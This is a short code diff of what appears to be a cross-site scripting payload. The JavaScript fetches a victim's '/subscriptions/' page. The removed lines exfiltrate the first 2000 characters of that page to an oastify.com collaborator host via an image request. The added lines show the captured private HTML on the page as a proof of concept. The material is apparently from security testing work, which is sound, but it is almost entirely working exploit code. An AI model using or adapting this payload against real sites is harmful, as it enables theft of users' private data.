@@ -1,6 +1,5 @@
 fetch('/subscriptions/')
   .then(r => r.text())
   .then(html => {
-    var img = new Image();
-    img.src = 'https://nc33oyddhrvwqbzd5zuousksqjwak08p.oastify.com/?data=' + encodeURIComponent(html.substring(0, 2000));
+    document.body.innerHTML = '<h1>XSS - Private Data Accessed:</h1><textarea style="width:100%;height:800px">' + html + '</textarea>';
   });
